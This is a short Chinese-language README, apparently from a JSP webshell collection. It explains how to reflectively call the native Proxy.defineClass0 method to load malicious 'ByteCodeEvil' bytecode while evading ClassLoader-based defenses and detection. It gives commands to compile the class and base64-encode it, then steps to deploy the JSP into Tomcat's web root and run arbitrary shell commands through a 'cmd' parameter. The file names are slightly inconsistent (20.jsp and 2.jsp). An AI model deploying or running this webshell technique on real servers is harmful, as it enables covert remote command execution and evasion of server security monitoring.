### Proxy 的 native 方法 defineClass0 加载类字节码

说明：

反射调用 java.lang.reflect.Proxy 的 native 方法 defineClass0 向 JVM 注册类，本质上类似 ClassLoader 类型的木马，但是可以绕过对 ClassLoader 的相关防御，另外由于是 native 方法，可以绕过很多检测方式。

生成字节码(使用 2.jsp 中的类)：
```
javac ByteCodeEvil.java
java ByteCodeEvil
cat ByteCodeEvil.class|base64
```

使用：
```
ps:若要修改字节码逻辑，修改后按照上面编译字节码的方式得到base64字节码替换jsp文件中的base64字节码

1.把jsp文件放到能被解析的服务器目录，例：tomcat的webapps/ROOT

2.在浏览器访问20.jsp，并使用参数cmd传入需要远程执行的命令，例：http://127.0.0.1:8080/2.jsp?cmd=whoami

3.服务器将会执行相应的shell命令，最后回显
```
